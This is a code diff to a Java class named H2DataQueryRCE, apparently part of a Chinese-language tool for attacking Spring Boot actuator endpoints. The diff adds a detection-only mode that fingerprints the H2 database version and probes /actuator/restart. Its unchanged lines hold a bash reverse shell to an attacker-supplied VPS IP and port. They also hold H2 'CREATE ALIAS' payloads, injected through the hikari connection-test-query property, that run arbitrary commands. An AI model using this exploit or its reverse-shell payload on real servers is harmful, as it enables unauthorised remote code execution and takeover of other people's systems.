@@ -21,15 +21,17 @@ public class H2DataQueryRCE {
     public  String text;
     private String vpsIP;
     private String vpsPort;
+    private boolean isPoc;
     public static String cmdtmp ="bash -i >&/dev/tcp/%s/%s 0>&1";
     public String expData1 = "spring.datasource.hikari.connection-test-query=CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','/c','%s');";
     public String expData2 = "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','%s');\"}";
     public String flag = "T";
     public static int count;
-    public H2DataQueryRCE(String address,String vpsIP,String vpsPort){
+    public H2DataQueryRCE(String address,String vpsIP,String vpsPort,boolean isPoc){
         this.address = address;
         this.vpsIP = vpsIP;
         this.vpsPort = vpsPort;
+        this.isPoc = isPoc;
     }
     public void Result1(ResultCallback callback){
         String api = "/env";
@@ -197,6 +199,127 @@ public class H2DataQueryRCE {
             e.printStackTrace();
         }
     }
+
+    public void Result3(ResultCallback callback){
+        String api = "/env";
+        String site = address + api;
+        String llib = "h2database";
+        String ua = "";
+        disableSSLVerification();
+        try {
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            in.close();
+            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
+                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = String.format("h2database 依赖为: %s", matcher.group(1));
+                    callback.onResult(text);
+                    URL obj1 = new URL(address + "/actuator");
+                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    conn1.setDoOutput(true);
+                    conn1.setRequestProperty("User-Agent", ua);
+                    conn1.setRequestMethod("GET");
+                    int responseCode1 = conn1.getResponseCode();
+                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                    String inputLine1;
+                    StringBuilder response1 = new StringBuilder();
+                    while ((inputLine1 = in1.readLine()) != null) {
+                        response1.append(inputLine1);
+                    }
+                    in1.close();
+                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
+                        text = "可能存在漏洞";
+                        callback.onResult(text);
+                    }else {
+                        text = "不存在可利用漏洞";
+                        callback.onResult(text);
+                    }
+                }else {
+                    text = "不存在可利用漏洞";
+                    callback.onResult(text);
+                }
+            }
+        }catch (Exception e){
+            text = "发起请求异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
+    public void Result4(ResultCallback callback){
+        String api = "/actuator/env";
+        String site = address + api;
+        String llib = "h2database";
+        String ua = "";
+        disableSSLVerification();
+        try {
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            in.close();
+            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
+                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = String.format("h2database 依赖为: %s", matcher.group(1));
+                    callback.onResult(text);
+                    URL obj1 = new URL(address + "/actuator");
+                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    conn1.setDoOutput(true);
+                    conn1.setRequestProperty("User-Agent", ua);
+                    conn1.setRequestMethod("GET");
+                    int responseCode1 = conn1.getResponseCode();
+                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                    String inputLine1;
+                    StringBuilder response1 = new StringBuilder();
+                    while ((inputLine1 = in1.readLine()) != null) {
+                        response1.append(inputLine1);
+                    }
+                    in1.close();
+                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
+                        text = "可能存在漏洞";
+                        callback.onResult(text);
+                    }else {
+                        text = "不存在可利用漏洞";
+                        callback.onResult(text);
+                    }
+                }else {
+                    text = "不存在可利用漏洞";
+                    callback.onResult(text);
+                }
+            }
+        }catch (Exception e){
+            text = "发起请求异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
     public void Exp(ResultCallback callback){
         String api ="/actuator/env";
         String site = address + api;
@@ -215,11 +338,19 @@ public class H2DataQueryRCE {
                 // 存在路径是springboot2，否则是springboot1
                 text = "当前版本为springboot2";
                 callback.onResult(text);
-                Result2(callback);
+                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
+                    Result4(callback);
+                }else {
+                    Result2(callback);
+                }
             }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                 text = "当前版本为springboot1";
                 callback.onResult(text);
-                Result1(callback);
+                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
+                    Result3(callback);
+                }else {
+                    Result1(callback);
+                }
             }else{
                 text = "未识别springboot版本";
                 callback.onResult(text);
